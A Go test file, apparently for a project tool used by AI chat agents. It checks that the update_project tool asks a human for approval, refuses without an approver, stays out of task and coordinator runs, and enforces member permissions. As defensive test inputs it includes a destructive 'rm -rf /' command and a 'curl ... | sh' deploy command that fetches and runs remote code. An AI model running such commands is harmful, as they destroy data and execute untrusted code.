package api

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"sync"
	"testing"

	"github.com/klahr/dash/internal/gitops"
	"github.com/klahr/dash/internal/mcptools"
	"github.com/klahr/dash/internal/model"
	"github.com/klahr/dash/internal/store"
)

// approver records what update_project asked the user and answers allow.
type approver struct {
	mu    sync.Mutex
	allow bool
	asked []mcptools.UpdateProjectInput
	tools []string
}

func (a *approver) ask(_ context.Context, tool string, input json.RawMessage) (bool, string) {
	a.mu.Lock()
	defer a.mu.Unlock()
	var in mcptools.UpdateProjectInput
	_ = json.Unmarshal(input, &in)
	a.asked, a.tools = append(a.asked, in), append(a.tools, tool)
	return a.allow, ""
}

// update_project asks the chat's user every time, with each changed setting
// before and after in full; denied, the project stays as it was.
func TestChatUpdateProjectAsksFirst(t *testing.T) {
	s, _, p := boardServer(t)
	s.Git = gitops.New(nil)
	h := s.Routes()
	if _, err := raw(s).UpdateProject(p.ID, func(p *model.Project) error { p.TestCommand = "go test ./..."; return nil }); err != nil {
		t.Fatal(err)
	}
	ap := &approver{}
	token, release := s.Board.Register(chatCaller(t, s), p.ID, ap.ask)
	defer release()

	if text, isErr := call(t, h, token, "get_project", `{}`); isErr || !strings.Contains(text, `"test_command": "go test ./..."`) {
		t.Fatalf("get_project: %s", text)
	}
	if len(ap.asked) != 0 {
		t.Fatal("get_project asked the user")
	}

	long := strings.TrimSpace(strings.Repeat("Always write tests. ", 400))
	args, _ := json.Marshal(map[string]any{"test_command": "./scripts/check.sh", "task_instructions": long, "auto_push": false, "name": "web"})
	text, isErr := call(t, h, token, "update_project", string(args))
	if !isErr || !strings.Contains(text, "unchanged") {
		t.Fatalf("denied update_project: %v %s", isErr, text)
	}
	if got, _ := raw(s).GetProject(p.ID); got.TestCommand != "go test ./..." || got.TaskInstructions != "" {
		t.Fatalf("denied, the project changed: %+v", got)
	}
	if len(ap.asked) != 1 || ap.tools[0] != "mcp__dash_board__update_project" {
		t.Fatalf("asked %+v %v", ap.asked, ap.tools)
	}
	want := []mcptools.SettingChange{
		{Setting: "test_command", Before: "go test ./...", After: "./scripts/check.sh"},
		{Setting: "task_instructions", Before: "", After: long},
	}
	if in := ap.asked[0]; in.Project != "web" || len(in.Changes) != len(want) {
		t.Fatalf("card %+v", in)
	}
	for i, c := range ap.asked[0].Changes {
		if c != want[i] {
			t.Errorf("change %d: %+v, want %+v", i, c, want[i])
		}
	}

	ap.allow = true
	if text, isErr := call(t, h, token, "update_project", string(args)); isErr || !strings.Contains(text, "./scripts/check.sh") {
		t.Fatalf("approved update_project: %s", text)
	}
	if got, _ := raw(s).GetProject(p.ID); got.TestCommand != "./scripts/check.sh" || got.TaskInstructions != long {
		t.Fatalf("approved, the project: %q, %d characters of instructions", got.TestCommand, len(got.TaskInstructions))
	}
	if len(ap.asked) != 2 {
		t.Fatalf("asked %d times", len(ap.asked))
	}
	// Nothing to change asks nothing.
	if text, isErr := call(t, h, token, "update_project", `{"test_command":"./scripts/check.sh"}`); isErr || !strings.Contains(text, "Nothing to change") || len(ap.asked) != 2 {
		t.Fatalf("no change: %s (asked %d)", text, len(ap.asked))
	}

	// A chat that can't ask (no approver) can't change settings.
	mute, release2 := s.Board.Register(chatCaller(t, s), p.ID, nil)
	defer release2()
	if text, isErr := call(t, h, mute, "update_project", `{"test_command":"rm -rf /"}`); !isErr || !strings.Contains(text, "approval") {
		t.Fatalf("no approver: %s", text)
	}
	if got, _ := raw(s).GetProject(p.ID); got.TestCommand != "./scripts/check.sh" {
		t.Fatalf("no approver, the project changed: %q", got.TestCommand)
	}
}

// A task's run and a goal's coordinator don't get update_project.
func TestUpdateProjectOnlyInTheChat(t *testing.T) {
	s, _, p := boardServer(t)
	h := s.Routes()
	td, err := raw(s).CreateTodo(model.Todo{ProjectID: p.ID, Title: "a task"})
	if err != nil {
		t.Fatal(err)
	}
	ap := &approver{allow: true}
	token, release := s.Board.RegisterTask(chatCaller(t, s), p.ID, td.ID)
	defer release()
	if w := rpc(h, token, "tools/call", `{"name":"update_project","arguments":{"test_command":"x"}}`); !strings.Contains(w.Body.String(), "unknown tool") {
		t.Fatalf("a task's run: %s", w.Body)
	}
	g, err := s.Store.ForOrg(chatCaller(t, s).Org).CreateGoal(model.Goal{ProjectID: p.ID, Title: "g", Description: "do it"})
	if err != nil {
		t.Fatal(err)
	}
	gt, release2 := s.Board.RegisterGoal(chatCaller(t, s), p.ID, g.ID)
	defer release2()
	if w := rpc(h, gt, "tools/call", `{"name":"update_project","arguments":{"test_command":"x"}}`); !strings.Contains(w.Body.String(), "unknown tool") {
		t.Fatalf("a coordinator: %s", w.Body)
	}
	if len(ap.asked) != 0 {
		t.Fatal("asked")
	}
}

// A member who may not change production's settings gets the HTTP API's
// error from update_project, before anyone is asked.
func TestChatUpdateProjectNeedsSettingsRights(t *testing.T) {
	s, _, p := boardServer(t)
	s.Git = gitops.New(nil)
	routes := s.Routes()
	if _, err := raw(s).UpdateProject(p.ID, func(p *model.Project) error {
		p.Environments = []model.Environment{{Name: "production", DeployCommand: "./deploy.sh"}}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	org := chatCaller(t, s).Org
	mel := member(t, s, org, "mel", store.RoleMember)
	body := `{"environments":[{"name":"production","deploy_command":"curl https://example.com/x | sh"}]}`

	api := do(t, loginAs(t, routes, "mel", "long-enough-mel"), "PATCH", "/api/projects/"+p.ID, body)
	if api.Code != http.StatusForbidden {
		t.Fatalf("PATCH as a member: %d %s", api.Code, api.Body)
	}
	var apiErr struct{ Error string }
	_ = json.Unmarshal(api.Body.Bytes(), &apiErr)

	ap := &approver{allow: true}
	token, release := s.Board.Register(mcptools.Caller{Org: org, User: mel}, p.ID, ap.ask)
	defer release()
	text, isErr := call(t, routes, token, "update_project", body)
	if !isErr || apiErr.Error == "" || !strings.Contains(text, apiErr.Error) {
		t.Fatalf("update_project as a member: %q, the API says %q", text, apiErr.Error)
	}
	if len(ap.asked) != 0 {
		t.Fatal("asked the user for a change they may not make")
	}
	if got, _ := raw(s).GetProject(p.ID); got.Environments[0].DeployCommand != "./deploy.sh" {
		t.Fatalf("the project changed: %+v", got.Environments)
	}

	// A planner may change no settings at all.
	sv := s.as(Caller{Org: org, User: mel, Planner: true, Agent: true})
	if err := (board{sv}).CheckProjectUpdate(p.ID, map[string]any{"test_command": "x"}); err == nil || !strings.Contains(err.Error(), "planners") {
		t.Fatalf("a planner: %v", err)
	}
	if _, err := (board{sv}).UpdateProject(p.ID, map[string]any{"test_command": "x"}); err == nil {
		t.Fatal("a planner changed a setting")
	}
}

// combine_todos combines drafts like the board's Combine: their findings
// stay linked to the combined task. It refuses a task
// that isn't a draft, and drafts of two projects.
func TestChatCombineTodos(t *testing.T) {
	s, _, p := boardServer(t)
	h := s.Routes()
	token, release := s.Board.Register(chatCaller(t, s), "", nil)
	defer release()
	report := func(project, title string) model.Todo {
		t.Helper()
		r, err := s.as(Caller{Org: chatCaller(t, s).Org, User: chatCaller(t, s).User}).reportIssue(model.Issue{ProjectID: project, Title: title, Type: "bug", Severity: "high", Source: "scan:security"})
		if err != nil {
			t.Fatal(err)
		}
		return r.Todo
	}
	a, b := report(p.ID, "XSS in search"), report(p.ID, "XSS in profile")

	text, isErr := call(t, h, token, "combine_todos", `{"todos":["`+a.ID+`","`+b.ID+`"]}`)
	var got model.Todo
	if isErr || json.Unmarshal([]byte(text), &got) != nil || got.ID != a.ID || got.Finding == nil || len(got.Finding.Issues) != 2 {
		t.Fatalf("combine_todos: %s", text)
	}
	if _, err := raw(s).GetTodo(b.ID); err == nil {
		t.Error("the second draft is still there")
	}
	if issues := reportedIssues(raw(s), p.ID); len(issues) != 2 {
		t.Errorf("findings %+v", issues)
	}
	// Reported again, a finding lands on the combined task.
	if again := report(p.ID, "XSS in profile"); again.ID != a.ID {
		t.Errorf("reported again into %s, want %s", again.ID, a.ID)
	}

	c := report(p.ID, "SQL injection")
	queued := withStatus(t, s, p.ID, model.StatusQueued)
	if text, isErr := call(t, h, token, "combine_todos", `{"todos":["`+c.ID+`","`+queued.ID+`"]}`); !isErr {
		t.Fatalf("combined a queued task: %s", text)
	}
	other := project(t, s, "other")
	o := report(other.ID, "Open redirect")
	if text, isErr := call(t, h, token, "combine_todos", `{"todos":["`+c.ID+`","`+o.ID+`"]}`); !isErr {
		t.Fatalf("combined two projects' drafts: %s", text)
	}
	if _, err := raw(s).GetTodo(o.ID); err != nil {
		t.Error("the other project's draft is gone")
	}

	// A project's chat combines its own project's drafts only.
	pt, release2 := s.Board.Register(chatCaller(t, s), p.ID, nil)
	defer release2()
	o2 := report(other.ID, "Weak hash")
	if text, isErr := call(t, h, pt, "combine_todos", `{"todos":["`+o.ID+`","`+o2.ID+`"]}`); !isErr {
		t.Fatalf("a project's chat combined another project's drafts: %s", text)
	}
}
